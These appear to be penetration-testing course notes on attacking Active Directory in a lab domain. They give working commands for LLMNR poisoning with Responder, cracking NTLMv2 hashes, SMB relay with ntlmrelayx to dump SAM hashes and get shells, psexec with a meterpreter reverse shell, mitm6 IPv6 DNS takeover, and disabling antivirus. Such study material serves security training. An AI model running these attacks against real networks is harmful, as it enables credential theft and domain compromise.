# Attacking Active Directory: Initial Attack Vectors

## LLMNR Poisoning
### What is LLMNR?
- Link Local Multicast Name Resolution
- Used to identify hosts when DNS fails to do so
- Previously NBT-NS (NetBIOS nameservice)
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to

## Capturing NTLMv2 Hashes with Responder

### Steps:

1. Step 1: Run responder
`python Responder.py -I tun0 -rdw`
2. Step 2: An Event occurs (user searches for incorrect share i.e the ip of the attacker machine running the responder share)

Result:

4. Step 3: Get dem hashes
5. Step 4: Crack dem hashes
`hashcat -m 5600 hashes.txt rockyou.txt`


## Password Cracking with Hashcat

`hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt`

> - Add -O (optimized) when running on bare metal
> - Use --force 
> - To run on windows, download binary then run the exe file
> - You can switch between using the CPU or GPU (search online)

Result:

## SMB Relay Attacks Overview

### What is SMB Relay?
- Instead of cracking hashes gathered with Responder, we can instread relay those hashes to specific machines and potentially gain acces

### Requirements
- SMB signing must be disabled on the target 
- Relayed user credentials must be admin on machine

### Steps:
1. Turn off SMB and HTTP in responder config `/usr/share/responder/Responder.conf`
2. Run responder
3. Set up your relay
`python ntlmrelayx.py -tf targets.txt -smb2support`
4. An event occurs... SMB signing disabled
5. Win (retrieve SAM file - similar to /etc/shadow file on linux)

## Discovering Hosts with SMB Signing Disabled

1. Run nmap script
`nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24`
2. Fill targets.txt with 'SMB signing not required' hosts

## SMB Relay Attack Demonstration

### Part 1
1. Edit `/etc/responder/Responder.conf` turn off SMB and HTTP
2. Start `sudo responder -I eth0 -rdwv`
3. Start `sudo python3 ntlmrelayx.py -tf targets.txt -smb2support`
4. Trigger the event by opening `\\192.168.57.7` on Frank Castle's machine
5. Get SAM hashes

### Part 2

1. Repeat steps 2 and 3 (with -i this time) in part 1
2. Run `nc 127.0.0.1 11000`

> - use -e test.exe to get shell with MSF after generating payload with MSF venom
> - use -c for running command

## Gaining shell access

### psexec(noisy options)
1. Run metasploit
2. Use psexec 
3. Set options
4. Set payload `windows/x64/meterpreter/reverse_tcp`
5. Set lhost `eth0`
6. Try running the exploit multiple times (sometimes works and sometimes doesn't)

### psexec.py
1. Try this is meterpreter doesn't work:
`psexec.py marvel.local/fcastle:Password1@192.168.57.5`

2. Also try; smbexec, wmiexec

> Pro tip: start with smbexec, wmiexec
> Figure out what antivirus is running and turn it off to allow meterpreter to run


## Ipv6 attacks overview

- Go to attack right now (much more reliable)

## Ipv6 DNS Takeover via mitm6
### Steps

1. Install mitm6 (github)
2. Setup mitm6
`sudo python3 mitm6.py -d marvel.local`
3. Run ntlmrelayx 
`sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -6 -t ldaps://192.168.57.4 -wh wpad.marvel.local -l lootme`
4. Wait for event (restart of machine or wait 30mins)
5. GG

## Other Attack vectors and strategies

Strategies:

- Begin day with mitm6 or responder
- Run scans to generate traffic
- If scans are taking too long, look for websites in scope (metasploit module - http_version)
- Look for default credentials on web logins
	- Printers
	- Jenkins
	- Etc
- Think outside the box
